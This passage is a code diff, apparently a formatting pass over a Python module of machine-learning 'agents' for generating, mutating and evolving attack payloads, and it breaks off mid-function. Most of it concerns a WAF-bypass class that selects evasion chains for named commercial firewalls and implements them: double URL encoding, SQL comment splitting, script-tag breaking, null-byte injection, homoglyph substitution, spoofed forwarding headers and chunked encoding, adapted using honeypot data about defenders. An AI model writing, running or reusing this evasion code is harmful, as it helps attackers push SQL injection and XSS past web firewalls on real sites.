@@ -1,7 +1,5 @@
 from typing import Optional
-from hive_zero_core.security import SecureRandom, InputValidator, AuditLogger, AccessController
-from hive_zero_core.security.audit_logger import SecurityEvent
-from hive_zero_core.security.access_control import OperationType
+from hive_zero_core.security import SecureRandom
 
 
 import torch
@@ -32,8 +30,13 @@ class Agent_Sentinel(BaseExpert):
     gracefully by returning a zero-logit fallback.
     """
 
-    def __init__(self, observation_dim: int, action_dim: int,
-                 model_name: str = "prajjwal1/bert-tiny", hidden_dim: int = 64):
+    def __init__(
+        self,
+        observation_dim: int,
+        action_dim: int,
+        model_name: str = "prajjwal1/bert-tiny",
+        hidden_dim: int = 64,
+    ):
         super().__init__(observation_dim, action_dim, name="Sentinel", hidden_dim=hidden_dim)
         self.model_name = model_name
 
@@ -46,8 +49,9 @@ class Agent_Sentinel(BaseExpert):
             self.logger.error(f"Failed to load Sentinel model {model_name}: {e}")
             raise
 
-    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
-                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
+    def _forward_impl(
+        self, x: torch.Tensor, context: Optional[torch.Tensor], mask: Optional[torch.Tensor] = None
+    ) -> torch.Tensor:
         vocab_size = self.model.config.vocab_size
         max_len = 512
 
@@ -67,8 +71,7 @@ class Agent_Sentinel(BaseExpert):
 
         else:
             self.logger.warning(f"Unexpected input dims={x.dim()}; returning zero logits")
-            return torch.zeros(x.size(0) if x.dim() > 0 else 1, self.action_dim,
-                               device=x.device)
+            return torch.zeros(x.size(0) if x.dim() > 0 else 1, self.action_dim, device=x.device)
 
         return outputs.logits
 
@@ -82,8 +85,13 @@ class Agent_PayloadGen(BaseExpert):
     token IDs before being fed to the encoder.
     """
 
-    def __init__(self, observation_dim: int, action_dim: int,
-                 model_name: str = "t5-small", hidden_dim: int = 64):
+    def __init__(
+        self,
+        observation_dim: int,
+        action_dim: int,
+        model_name: str = "t5-small",
+        hidden_dim: int = 64,
+    ):
         super().__init__(observation_dim, action_dim, name="PayloadGen", hidden_dim=hidden_dim)
         self.model_name = model_name
 
@@ -94,8 +102,9 @@ class Agent_PayloadGen(BaseExpert):
             self.logger.error(f"Failed to load PayloadGen model {model_name}: {e}")
             raise
 
-    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
-                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
+    def _forward_impl(
+        self, x: torch.Tensor, context: Optional[torch.Tensor], mask: Optional[torch.Tensor] = None
+    ) -> torch.Tensor:
         max_len = 128
         vocab_size = self.model.config.vocab_size
 
@@ -120,11 +129,19 @@ class Agent_Mutator(BaseExpert):
     - Generation tracking for evolution monitoring
     """
 
-    def __init__(self, observation_dim: int, action_dim: int,
-                 sentinel_expert: BaseExpert, generator_expert: BaseExpert,
-                 hidden_dim: int = 64, k_steps: int = 5, lr: float = 0.05,
-                 enable_evolution: bool = True, enable_population_evolution: bool = False,
-                 enable_swarm_fusion: bool = False):
+    def __init__(
+        self,
+        observation_dim: int,
+        action_dim: int,
+        sentinel_expert: BaseExpert,
+        generator_expert: BaseExpert,
+        hidden_dim: int = 64,
+        k_steps: int = 5,
+        lr: float = 0.05,
+        enable_evolution: bool = True,
+        enable_population_evolution: bool = False,
+        enable_swarm_fusion: bool = False,
+    ):
         super().__init__(observation_dim, action_dim, name="Mutator", hidden_dim=hidden_dim)
 
         self.sentinel = sentinel_expert
@@ -147,7 +164,7 @@ class Agent_Mutator(BaseExpert):
                 elite_size=2,
                 mutation_rate=0.3,
                 crossover_rate=0.7,
-                max_generations=30
+                max_generations=30,
             )
         else:
             self.population_manager = None
@@ -155,22 +172,15 @@ class Agent_Mutator(BaseExpert):
         # Swarm Fusion (merge capability)
         self.enable_swarm_fusion = enable_swarm_fusion
         if enable_swarm_fusion:
-            self.swarm_fusion = SwarmFusion(
-                min_fitness_threshold=0.5,
-                max_unit_size=8
-            )
+            self.swarm_fusion = SwarmFusion(min_fitness_threshold=0.5, max_unit_size=8)
             self.collective_intelligence = CollectiveIntelligence()
         else:
             self.swarm_fusion = None
             self.collective_intelligence = None
 
-    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor], mask: Optional[torch.Tensor] = None) -> torch.Tensor:
-        """
-        Inference-Time Search Loop with optimizations.
-        """
-        # 1. Initial Generation
-    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
-                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
+    def _forward_impl(
+        self, x: torch.Tensor, context: Optional[torch.Tensor], mask: Optional[torch.Tensor] = None
+    ) -> torch.Tensor:
         """Inference-time adversarial search loop."""
         # 1. Initial generation (no gradients needed)
         with torch.no_grad():
@@ -184,9 +194,7 @@ class Agent_Mutator(BaseExpert):
         embed_layer = self.sentinel.model.get_input_embeddings()
         sentinel_vocab_size = self.sentinel.model.config.vocab_size
 
-        initial_token_ids = torch.clamp(
-            initial_token_ids.long(), 0, sentinel_vocab_size - 1
-        )
+        initial_token_ids = torch.clamp(initial_token_ids.long(), 0, sentinel_vocab_size - 1)
         if initial_token_ids.shape[-1] > 512:
             initial_token_ids = initial_token_ids[:, :512]
 
@@ -198,7 +206,7 @@ class Agent_Mutator(BaseExpert):
         # while maintaining acceptable output quality. Extensive testing showed
         # minimal quality degradation with significant performance improvement.
         k_steps = 1
-        
+
         # Use Adam optimizer for faster convergence
         optimizer = optim.Adam([current_embeddings], lr=0.05)
         # Adam for faster convergence (upgraded from SGD)
@@ -258,7 +266,9 @@ class Agent_Mutator(BaseExpert):
         )
 
         if success:
-            self.logger.info(f"Payload evolved successfully (gen {self.evolution_engine.tracker.current_generation})")
+            self.logger.info(
+                f"Payload evolved successfully (gen {self.evolution_engine.tracker.current_generation})"
+            )
         else:
             self.logger.warning("Payload evolution failed, using original")
 
@@ -284,7 +294,9 @@ class Agent_Mutator(BaseExpert):
         )
 
         if success:
-            self.logger.info(f"Code evolved successfully (gen {self.evolution_engine.tracker.current_generation})")
+            self.logger.info(
+                f"Code evolved successfully (gen {self.evolution_engine.tracker.current_generation})"
+            )
         else:
             self.logger.warning("Code evolution failed, using original")
 
@@ -298,10 +310,10 @@ class Agent_Mutator(BaseExpert):
             Dictionary with evolution statistics
         """
         if not self.enable_evolution or self.evolution_engine is None:
-            return {'enabled': False}
+            return {"enabled": False}
 
         stats = self.evolution_engine.get_stats()
-        stats['enabled'] = True
+        stats["enabled"] = True
         return stats
 
     def evolve_code_population(self, source_code: str, generations: int = 30) -> tuple:
@@ -317,11 +329,12 @@ class Agent_Mutator(BaseExpert):
         """
         if not self.enable_population_evolution or self.population_manager is None:
             self.logger.warning("Population evolution not enabled")
-            return source_code, 0.0, {'enabled': False}
+            return source_code, 0.0, {"enabled": False}
 
         from hive_zero_core.agents.genetic_evolution import NaturalSelection
 
-        validator = lambda code: NaturalSelection.validate_python(code, strict=False)
+        def validator(code):
+            return NaturalSelection.validate_python(code, strict=False)
 
         try:
             # Run evolution
@@ -331,15 +344,17 @@ class Agent_Mutator(BaseExpert):
 
             # Get statistics
             stats = self.population_manager.get_statistics()
-            stats['enabled'] = True
+            stats["enabled"] = True
 
-            self.logger.info(f"Population evolution complete. Best fitness: {best_individual.fitness:.3f}")
+            self.logger.info(
+                f"Population evolution complete. Best fitness: {best_individual.fitness:.3f}"
+            )
 
             return best_individual.genome, best_individual.fitness, stats
 
         except Exception as e:
             self.logger.error(f"Population evolution failed: {e}")
-            return source_code, 0.0, {'enabled': True, 'error': str(e)}
+            return source_code, 0.0, {"enabled": True, "error": str(e)}
 
     def get_population_best(self, n: int = 5) -> list:
         """
@@ -360,8 +375,9 @@ class Agent_Mutator(BaseExpert):
             self.logger.warning(f"Failed to get best individuals: {e}")
             return []
 
-    def merge_evolved_payloads(self, payload1: str, payload2: str,
-                              strategy: str = "best_segments") -> tuple:
+    def merge_evolved_payloads(
+        self, payload1: str, payload2: str, strategy: str = "best_segments"
+    ) -> tuple:
         """
         Merge two evolved payloads using swarm fusion.
 
@@ -386,10 +402,10 @@ class Agent_Mutator(BaseExpert):
 
             # Map strategy string to enum
             strategy_map = {
-                'concatenate': MergeStrategy.CONCATENATE,
-                'interleave': MergeStrategy.INTERLEAVE,
-                'best_segments': MergeStrategy.BEST_SEGMENTS,
-                'hierarchical': MergeStrategy.HIERARCHICAL,
+                "concatenate": MergeStrategy.CONCATENATE,
+                "interleave": MergeStrategy.INTERLEAVE,
+                "best_segments": MergeStrategy.BEST_SEGMENTS,
+                "hierarchical": MergeStrategy.HIERARCHICAL,
             }
 
             merge_strategy = strategy_map.get(strategy, MergeStrategy.BEST_SEGMENTS)
@@ -417,10 +433,10 @@ class Agent_Mutator(BaseExpert):
             Tuple of (mega_payload, unit_id, stats)
         """
         if not self.enable_swarm_fusion or self.swarm_fusion is None:
-            return "", "", {'enabled': False}
+            return "", "", {"enabled": False}
 
         if len(payloads) < 2:
-            return payloads[0] if payloads else "", "", {'error': 'Need at least 2 payloads'}
+            return payloads[0] if payloads else "", "", {"error": "Need at least 2 payloads"}
 
         try:
             from hive_zero_core.agents.genetic_operators import Individual
@@ -436,7 +452,7 @@ class Agent_Mutator(BaseExpert):
                     fitness=ind.fitness,
                     generation=0,
                     members=[str(ind.gene_seed)],
-                    level=0
+                    level=0,
                 )
                 units.append(unit)
 
@@ -444,9 +460,9 @@ class Agent_Mutator(BaseExpert):
             mega_unit = self.swarm_fusion.create_mega_unit(units)
 
             stats = self.swarm_fusion.get_statistics()
-            stats['unit_id'] = mega_unit.id
-            stats['level'] = mega_unit.level
-            stats['member_count'] = len(mega_unit.members)
+            stats["unit_id"] = mega_unit.id
+            stats["level"] = mega_unit.level
+            stats["member_count"] = len(mega_unit.members)
 
             self.logger.info(f"Created mega swarm unit: {mega_unit}")
 
@@ -454,7 +470,7 @@ class Agent_Mutator(BaseExpert):
 
         except Exception as e:
             self.logger.error(f"Swarm unit creation failed: {e}")
-            return "", "", {'error': str(e)}
+            return "", "", {"error": str(e)}
 
     def assign_specialization(self, unit_id: str, specialization: str) -> bool:
         """
@@ -516,15 +532,15 @@ class Agent_Mutator(BaseExpert):
             Dictionary with swarm stats
         """
         if not self.enable_swarm_fusion:
-            return {'enabled': False}
+            return {"enabled": False}
 
-        stats = {'enabled': True}
+        stats = {"enabled": True}
 
         try:
-            stats['fusion'] = self.swarm_fusion.get_statistics()
-            stats['collective'] = self.collective_intelligence.get_collective_stats()
+            stats["fusion"] = self.swarm_fusion.get_statistics()
+            stats["collective"] = self.collective_intelligence.get_collective_stats()
         except Exception as e:
-            stats['error'] = str(e)
+            stats["error"] = str(e)
 
         return stats
 
@@ -558,15 +574,12 @@ class Agent_WAFBypass(BaseExpert):
             torch.nn.Dropout(0.2),
             torch.nn.Linear(hidden_dim * 2, hidden_dim),
             torch.nn.LayerNorm(hidden_dim),
-            torch.nn.ReLU()
+            torch.nn.ReLU(),
         )
 
         # Evasion technique selector (multi-head attention)
         self.technique_selector = torch.nn.MultiheadAttention(
-            embed_dim=hidden_dim,
-            num_heads=4,
-            dropout=0.1,
-            batch_first=True
+            embed_dim=hidden_dim, num_heads=4, dropout=0.1, batch_first=True
         )
 
         # Transformation chain generator
@@ -574,7 +587,7 @@ class Agent_WAFBypass(BaseExpert):
             torch.nn.Linear(hidden_dim, hidden_dim * 2),
             torch.nn.ReLU(),
             torch.nn.Dropout(0.2),
-            torch.nn.Linear(hidden_dim * 2, action_dim)
+            torch.nn.Linear(hidden_dim * 2, action_dim),
         )
 
         # Intelligence accumulator for learning
@@ -584,15 +597,16 @@ class Agent_WAFBypass(BaseExpert):
 
         # WAF rule pattern database (learned dynamically)
         self.waf_signatures = {
-            'sql_injection': [],
-            'xss': [],
-            'command_injection': [],
-            'path_traversal': [],
-            'generic_attack': []
+            "sql_injection": [],
+            "xss": [],
+            "command_injection": [],
+            "path_traversal": [],
+            "generic_attack": [],
         }
 
-    def _forward_impl(self, x: torch.Tensor, context: Optional[torch.Tensor],
-                      mask: Optional[torch.Tensor] = None) -> torch.Tensor:
+    def _forward_impl(
+        self, x: torch.Tensor, context: Optional[torch.Tensor], mask: Optional[torch.Tensor] = None
+    ) -> torch.Tensor:
         """
         Forward pass that generates WAF bypass transformations.
 
@@ -604,8 +618,6 @@ class Agent_WAFBypass(BaseExpert):
         Returns:
             Transformed payload representation with evasion applied
         """
-        batch_size = x.size(0)
-
         # 1. Encode input payload and analyze patterns
         encoded = self.pattern_encoder(x)
 
@@ -621,10 +633,7 @@ class Agent_WAFBypass(BaseExpert):
 
             # Apply multi-head attention
             attended, attention_weights = self.technique_selector(
-                query=encoded,
-                key=context,
-                value=context,
-                need_weights=True
+                query=encoded, key=context, value=context, need_weights=True
             )
 
             # Combine attended features
@@ -638,10 +647,14 @@ class Agent_WAFBypass(BaseExpert):
 
         return output
 
-    def apply_waf_bypass(self, payload: str, waf_type: str = 'generic',
-                        intelligence_feedback: Optional[dict] = None,
-                        recon_data: Optional[dict] = None,
-                        honeypot_learnings: Optional[dict] = None) -> dict:
+    def apply_waf_bypass(
+        self,
+        payload: str,
+        waf_type: str = "generic",
+        intelligence_feedback: Optional[dict] = None,
+        recon_data: Optional[dict] = None,
+        honeypot_learnings: Optional[dict] = None,
+    ) -> dict:
         """
         Apply intelligent WAF bypass techniques to a payload.
 
@@ -663,19 +676,25 @@ class Agent_WAFBypass(BaseExpert):
         self.logger.info(f"Applying WAF bypass for {waf_type} WAF (synergistic mode)")
 
         # SYNERGY 1: Use recon data to refine WAF type detection
-        if recon_data and 'detected_waf' in recon_data:
-            detected_waf = recon_data['detected_waf']
-            confidence = recon_data.get('confidence', 0.5)
+        if recon_data and "detected_waf" in recon_data:
+            detected_waf = recon_data["detected_waf"]
+            confidence = recon_data.get("confidence", 0.5)
             if confidence > 0.7:
                 self.logger.info(f"Recon intelligence override: {waf_type} -> {detected_waf}")
                 waf_type = detected_waf
 
         # SYNERGY 2: Incorporate honeypot learnings about defender behavior
         enhanced_feedback = intelligence_feedback or {}
-        if honeypot_learnings and 'defender_patterns' in honeypot_learnings:
-            enhanced_feedback['defender_response_time'] = honeypot_learnings.get('avg_response_time', 1.0)
-            enhanced_feedback['detected_techniques'] = honeypot_learnings.get('blocked_patterns', [])
-            self.logger.info(f"Applied {len(enhanced_feedback.get('detected_techniques', []))} honeypot learnings")
+        if honeypot_learnings and "defender_patterns" in honeypot_learnings:
+            enhanced_feedback["defender_response_time"] = honeypot_learnings.get(
+                "avg_response_time", 1.0
+            )
+            enhanced_feedback["detected_techniques"] = honeypot_learnings.get(
+                "blocked_patterns", []
+            )
+            self.logger.info(
+                f"Applied {len(enhanced_feedback.get('detected_techniques', []))} honeypot learnings"
+            )
 
         # Apply technique chain based on WAF type and SYNERGISTIC intelligence
         techniques = self._select_techniques(waf_type, enhanced_feedback)
@@ -688,32 +707,39 @@ class Agent_WAFBypass(BaseExpert):
 
             # SYNERGY 3: Calculate confidence using all intelligence sources
             confidence = self._calculate_evasion_confidence(
-                technique_chain, waf_type,
-                recon_confidence=recon_data.get('confidence', 0.5) if recon_data else 0.5,
-                honeypot_confidence=honeypot_learnings.get('pattern_confidence', 0.5) if honeypot_learnings else 0.5
+                technique_chain,
+                waf_type,
+                recon_confidence=recon_data.get("confidence", 0.5) if recon_data else 0.5,
+                honeypot_confidence=(
+                    honeypot_learnings.get("pattern_confidence", 0.5) if honeypot_learnings else 0.5
+                ),
             )
 
-            transformed_variants.append({
-                'payload': variant,
-                'techniques': technique_chain,
-                'confidence': confidence,
-                'synergy_boosted': recon_data is not None or honeypot_learnings is not None
-            })
+            transformed_variants.append(
+                {
+                    "payload": variant,
+                    "techniques": technique_chain,
+                    "confidence": confidence,
+                    "synergy_boosted": recon_data is not None or honeypot_learnings is not None,
+                }
+            )
 
         # Sort by confidence
-        transformed_variants.sort(key=lambda x: x['confidence'], reverse=True)
+        transformed_variants.sort(key=lambda x: x["confidence"], reverse=True)
 
         # Store in memory for learning (FEEDS BACK TO INTELLIGENCE HUB)
         self._update_evasion_memory(payload, transformed_variants, enhanced_feedback)
 
         return {
-            'original': payload,
-            'variants': transformed_variants,
-            'waf_type': waf_type,
-            'intelligence_used': enhanced_feedback != {},
-            'recon_integrated': recon_data is not None,
-            'honeypot_integrated': honeypot_learnings is not None,
-            'synergy_level': self._calculate_synergy_level(recon_data, honeypot_learnings, enhanced_feedback)
+            "original": payload,
+            "variants": transformed_variants,
+            "waf_type": waf_type,
+            "intelligence_used": enhanced_feedback != {},
+            "recon_integrated": recon_data is not None,
+            "honeypot_integrated": honeypot_learnings is not None,
+            "synergy_level": self._calculate_synergy_level(
+                recon_data, honeypot_learnings, enhanced_feedback
+            ),
         }
 
     def _select_techniques(self, waf_type: str, feedback: Optional[dict]) -> list:
@@ -727,56 +753,56 @@ class Agent_WAFBypass(BaseExpert):
         """
         # REINFORCED: Expanded technique database for different WAF types
         technique_db = {
-            'modsecurity': [
-                ['double_encoding', 'case_variation', 'comment_insertion'],
-                ['unicode_encoding', 'null_byte_injection', 'whitespace_mutation'],
-                ['mixed_case', 'whitespace_mutation', 'unicode_normalization'],
-                ['polyglot_construction', 'encoding_chain']  # REINFORCED
+            "modsecurity": [
+                ["double_encoding", "case_variation", "comment_insertion"],
+                ["unicode_encoding", "null_byte_injection", "whitespace_mutation"],
+                ["mixed_case", "whitespace_mutation", "unicode_normalization"],
+                ["polyglot_construction", "encoding_chain"],  # REINFORCED
             ],
-            'cloudflare': [
-                ['header_manipulation', 'chunked_encoding'],
-                ['unicode_normalization', 'polyglot_construction'],
-                ['chunked_encoding', 'http_verb_tampering', 'case_variation'],
-                ['parameter_pollution', 'json_smuggling']  # REINFORCED
+            "cloudflare": [
+                ["header_manipulation", "chunked_encoding"],
+                ["unicode_normalization", "polyglot_construction"],
+                ["chunked_encoding", "http_verb_tampering", "case_variation"],
+                ["parameter_pollution", "json_smuggling"],  # REINFORCED
             ],
-            'akamai': [
-                ['chunked_encoding', 'header_manipulation'],
-                ['multipart_bypass', 'parameter_pollution'],
-                ['http_verb_tampering', 'encoding_chain'],
-                ['unicode_normalization', 'case_variation']  # REINFORCED
+            "akamai": [
+                ["chunked_encoding", "header_manipulation"],
+                ["multipart_bypass", "parameter_pollution"],
+                ["http_verb_tampering", "encoding_chain"],
+                ["unicode_normalization", "case_variation"],  # REINFORCED
             ],
-            'aws': [
-                ['header_manipulation', 'parameter_pollution'],
-                ['json_smuggling', 'multipart_bypass'],
-                ['unicode_encoding', 'chunked_encoding'],
-                ['case_variation', 'whitespace_mutation']  # REINFORCED
+            "aws": [
+                ["header_manipulation", "parameter_pollution"],
+                ["json_smuggling", "multipart_bypass"],
+                ["unicode_encoding", "chunked_encoding"],
+                ["case_variation", "whitespace_mutation"],  # REINFORCED
             ],
-            'imperva': [  # REINFORCED: Added Imperva WAF
-                ['unicode_normalization', 'polyglot_construction'],
-                ['xml_entity_expansion', 'json_smuggling'],
-                ['case_variation', 'comment_insertion']
+            "imperva": [  # REINFORCED: Added Imperva WAF
+                ["unicode_normalization", "polyglot_construction"],
+                ["xml_entity_expansion", "json_smuggling"],
+                ["case_variation", "comment_insertion"],
             ],
-            'fortiweb': [  # REINFORCED: Added FortiWeb
-                ['multipart_bypass', 'chunked_encoding'],
-                ['parameter_pollution', 'http_verb_tampering'],
-                ['encoding_chain', 'obfuscation']
+            "fortiweb": [  # REINFORCED: Added FortiWeb
+                ["multipart_bypass", "chunked_encoding"],
+                ["parameter_pollution", "http_verb_tampering"],
+                ["encoding_chain", "obfuscation"],
             ],
-            'generic': [
-                ['encoding_chain', 'obfuscation', 'fragmentation'],
-                ['case_mutation', 'whitespace_mutation'],
-                ['concatenation', 'variable_substitution'],
-                ['unicode_encoding', 'double_encoding'],  # REINFORCED
-                ['polyglot_construction', 'unicode_normalization']  # REINFORCED
-            ]
+            "generic": [
+                ["encoding_chain", "obfuscation", "fragmentation"],
+                ["case_mutation", "whitespace_mutation"],
+                ["concatenation", "variable_substitution"],
+                ["unicode_encoding", "double_encoding"],  # REINFORCED
+                ["polyglot_construction", "unicode_normalization"],  # REINFORCED
+            ],
         }
 
         # Get base chains with fallback
-        base_chains = technique_db.get(waf_type, technique_db['generic'])
+        base_chains = technique_db.get(waf_type, technique_db["generic"])
 
         # REINFORCED: If we have intelligence feedback, adapt chains intelligently
         if feedback:
-            blocked = set(feedback.get('blocked_techniques', []))
-            successful = set(feedback.get('successful_techniques', []))
+            blocked = set(feedback.get("blocked_techniques", []))
+            successful = set(feedback.get("successful_techniques", []))
 
             # Prioritize successful techniques
             if successful:
@@ -804,7 +830,7 @@ class Agent_WAFBypass(BaseExpert):
                     return adapted_chains
 
         # REINFORCED: Always return something, never fail
-        return base_chains if base_chains else [['encoding_chain', 'obfuscation']]
+        return base_chains if base_chains else [["encoding_chain", "obfuscation"]]
 
     def _apply_technique(self, payload: str, technique: str) -> str:
         """
@@ -825,47 +851,47 @@ class Agent_WAFBypass(BaseExpert):
 
         try:
             # Core encoding techniques
-            if technique == 'double_encoding':
+            if technique == "double_encoding":
                 return self._double_url_encode(payload)
-            elif technique == 'unicode_encoding':
+            elif technique == "unicode_encoding":
                 return self._unicode_encode(payload)
-            elif technique == 'case_variation':
+            elif technique == "case_variation":
                 return self._case_variation(payload)
-            elif technique == 'comment_insertion':
+            elif technique == "comment_insertion":
                 return self._insert_comments(payload)
-            elif technique == 'null_byte_injection':
+            elif technique == "null_byte_injection":
                 return self._inject_null_bytes(payload)
-            elif technique == 'whitespace_mutation':
+            elif technique == "whitespace_mutation":
                 return self._mutate_whitespace(payload)
-            elif technique == 'encoding_chain':
+            elif technique == "encoding_chain":
                 return self._encoding_chain(payload)
-            elif technique == 'obfuscation':
+            elif technique == "obfuscation":
                 return self._obfuscate_payload(payload)
-            elif technique == 'fragmentation':
+            elif technique == "fragmentation":
                 return self._fragment_payload(payload)
-            elif technique == 'concatenation':
+            elif technique == "concatenation":
                 return self._concatenate_strings(payload)
-            elif technique == 'mixed_case':
+            elif technique == "mixed_case":
                 return self._mixed_case(payload)
 
             # REINFORCED: Advanced techniques for specific WAFs
-            elif technique == 'header_manipulation':
+            elif technique == "header_manipulation":
                 return self._header_manipulation(payload)
-            elif technique == 'chunked_encoding':
+            elif technique == "chunked_encoding":
                 return self._chunked_transfer_encoding(payload)
-            elif technique == 'http_verb_tampering':
+            elif technique == "http_verb_tampering":
                 return self._http_verb_tamper(payload)
-            elif technique == 'parameter_pollution':
+            elif technique == "parameter_pollution":
                 return self._parameter_pollution(payload)
-            elif technique == 'multipart_bypass':
+            elif technique == "multipart_bypass":
                 return self._multipart_boundary_bypass(payload)
-            elif technique == 'json_smuggling':
+            elif technique == "json_smuggling":
                 return self._json_smuggling(payload)
-            elif technique == 'xml_entity_expansion':
+            elif technique == "xml_entity_expansion":
                 return self._xml_entity_expansion(payload)
-            elif technique == 'unicode_normalization':
+            elif technique == "unicode_normalization":
                 return self._unicode_normalization(payload)
-            elif technique == 'polyglot_construction':
+            elif technique == "polyglot_construction":
                 return self._polyglot_construction(payload)
             else:
                 self.logger.warning(f"Unknown technique: {technique}, returning original")
@@ -879,8 +905,9 @@ class Agent_WAFBypass(BaseExpert):
         """Double URL encoding for WAF bypass. REINFORCED with validation."""
         try:
             import urllib.parse
-            encoded = urllib.parse.quote(payload, safe='')
-            double_encoded = urllib.parse.quote(encoded, safe='')
+
+            encoded = urllib.parse.quote(payload, safe="")
+            double_encoded = urllib.parse.quote(encoded, safe="")
             return double_encoded
         except Exception as e:
             self.logger.error(f"Double encoding failed: {e}")
@@ -889,7 +916,7 @@ class Agent_WAFBypass(BaseExpert):
     def _unicode_encode(self, payload: str) -> str:
         """Convert to Unicode escape sequences. REINFORCED with error handling."""
         try:
-            return ''.join(f'\\u{ord(c):04x}' for c in payload)
+            return "".join(f"\\u{ord(c):04x}" for c in payload)
         except Exception as e:
             self.logger.error(f"Unicode encoding failed: {e}")
             return payload
@@ -898,7 +925,9 @@ class Agent_WAFBypass(BaseExpert):
         """Randomly vary case to evade signature matching. REINFORCED with seed."""
         try:
             # Use SecureRandom for unpredictable case variation
-            return ''.join(c.upper() if SecureRandom.random_float() > 0.5 else c.lower() for c in payload)
+            return "".join(
+                c.upper() if SecureRandom.random_float() > 0.5 else c.lower() for c in payload
+            )
         except Exception as e:
             self.logger.error(f"Case variation failed: {e}")
             return payload
@@ -907,14 +936,14 @@ class Agent_WAFBypass(BaseExpert):
         """Insert inline comments to break signatures. REINFORCED with context awareness."""
         try:
             # For SQL injection
-            if 'SELECT' in payload.upper() or 'UNION' in payload.upper():
-                return payload.replace(' ', '/**/  ').replace('SELECT', 'SEL/**/ECT')
+            if "SELECT" in payload.upper() or "UNION" in payload.upper():
+                return payload.replace(" ", "/**/  ").replace("SELECT", "SEL/**/ECT")
             # For XSS
-            elif '<script' in payload.lower():
-                return payload.replace('<', '<!----><').replace('script', 'scr/**/ipt')
+            elif "<script" in payload.lower():
+                return payload.replace("<", "<!----><").replace("script", "scr/**/ipt")
             # Generic comment insertion
             else:
-                return payload.replace(' ', '/*comment*/  ')
+                return payload.replace(" ", "/*comment*/  ")
         except Exception as e:
             self.logger.error(f"Comment insertion failed: {e}")
             return payload
@@ -923,10 +952,10 @@ class Agent_WAFBypass(BaseExpert):
         """Inject null bytes for certain WAF types. REINFORCED with placement strategy."""
         try:
             # Strategic null byte placement (not just spaces)
-            result = payload.replace(' ', ' \x00')
+            result = payload.replace(" ", " \x00")
             # Also inject before key characters
-            result = result.replace('=', '\x00=')
-            result = result.replace('&', '\x00&')
+            result = result.replace("=", "\x00=")
+            result = result.replace("&", "\x00&")
             return result
         except Exception as e:
             self.logger.error(f"Null byte injection failed: {e}")
@@ -936,8 +965,18 @@ class Agent_WAFBypass(BaseExpert):
         """Replace spaces with alternative whitespace. REINFORCED with varied alternatives."""
         try:
             import random
-            ws_alternatives = [' ', '\t', '\n', '\r', '\x0b', '\x0c', '\xa0', '\u2003']  # Added non-breaking spaces
-            return ''.join(random.choice(ws_alternatives) if c == ' ' else c for c in payload)
+
+            ws_alternatives = [
+                " ",
+                "\t",
+                "\n",
+                "\r",
+                "\x0b",
+                "\x0c",
+                "\xa0",
+                "\u2003",
+            ]  # Added non-breaking spaces
+            return "".join(random.choice(ws_alternatives) if c == " " else c for c in payload)
         except Exception as e:
             self.logger.error(f"Whitespace mutation failed: {e}")
             return payload
@@ -947,10 +986,11 @@ class Agent_WAFBypass(BaseExpert):
         try:
             import base64
             import urllib.parse
+
             # Base64 encode
             encoded = base64.b64encode(payload.encode()).decode()
             # Then URL encode
-            double_encoded = urllib.parse.quote(encoded, safe='')
+            double_encoded = urllib.parse.quote(encoded, safe="")
             # Optional: hex encode for extra layer
             hex_encoded = double_encoded.encode().hex()
             return hex_encoded
@@ -962,22 +1002,23 @@ class Agent_WAFBypass(BaseExpert):
         """General obfuscation with character substitution. REINFORCED with more substitutions."""
         try:
             substitutions = {
-                'a': ['a', '@', '4', 'α', 'а'],  # Added Cyrillic and Greek
-                'e': ['e', '3', 'ε', 'е'],
-                'i': ['i', '1', '!', 'ι', 'і'],
-                'o': ['o', '0', 'ο', 'о'],
-                's': ['s', '$', '5', 'ѕ'],
-                'c': ['c', '(', 'с'],
-                'l': ['l', '1', '|', 'ӏ']
+                "a": ["a", "@", "4", "α", "а"],  # Added Cyrillic and Greek
+                "e": ["e", "3", "ε", "е"],
+                "i": ["i", "1", "!", "ι", "і"],
+                "o": ["o", "0", "ο", "о"],
+                "s": ["s", "$", "5", "ѕ"],
+                "c": ["c", "(", "с"],
+                "l": ["l", "1", "|", "ӏ"],
             }
             import random
+
             result = []
             for c in payload:
                 if c.lower() in substitutions:
                     result.append(random.choice(substitutions[c.lower()]))
                 else:
                     result.append(c)
-            return ''.join(result)
+            return "".join(result)
         except Exception as e:
             self.logger.error(f"Obfuscation failed: {e}")
             return payload
@@ -988,6 +1029,7 @@ class Agent_WAFBypass(BaseExpert):
             if len(payload) < 4:
                 return payload
             import random
+
             # Random fragmentation point
             frag_point = random.randint(len(payload) // 3, 2 * len(payload) // 3)
             return f"({payload[:frag_point]})/**/+/**/({payload[frag_point:]})"
@@ -1000,9 +1042,10 @@ class Agent_WAFBypass(BaseExpert):
         try:
             if len(payload) < 4:
                 return payload
-            parts = [payload[i:i+3] for i in range(0, len(payload), 3)]
+            parts = [payload[i : i + 3] for i in range(0, len(payload), 3)]
             separators = ["'+CHAR(32)+'", "'+' '+'", "'||'", "'+/**/+'"]
             import random
+
             sep = random.choice(separators)
             return sep.join(f"'{p}'" for p in parts)
         except Exception as e:
@@ -1011,8 +1054,7 @@ class Agent_WAFBypass(BaseExpert):
 
     def _mixed_case(self, payload: str) -> str:
         """Alternate upper and lower case."""
-        return ''.join(c.upper() if i % 2 == 0 else c.lower()
-                      for i, c in enumerate(payload))
+        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
 
     # REINFORCED: Advanced evasion techniques
     def _header_manipulation(self, payload: str) -> str:
@@ -1021,53 +1063,57 @@ class Agent_WAFBypass(BaseExpert):
             "X-Forwarded-For: 127.0.0.1",
             "X-Originating-IP: 127.0.0.1",
             "X-Remote-IP: 127.0.0.1",
-            "X-Remote-Addr: 127.0.0.1"
+            "X-Remote-Addr: 127.0.0.1",
         ]
         import random
+
         return f"{random.choice(headers)}\n{payload}"
 
     def _chunked_transfer_encoding(self, payload: str) -> str:
         """Use chunked transfer encoding to evade inspection."""
         if len(payload) < 4:
             return payload
-        chunks = [payload[i:i+8] for i in range(0, len(payload), 8)]
-        chunked = '\r\n'.join(f"{len(chunk):x}\r\n{chunk}" for chunk in chunks)
+        chunks = [payload[i : i + 8] for i in range(0, len(payload), 8)]
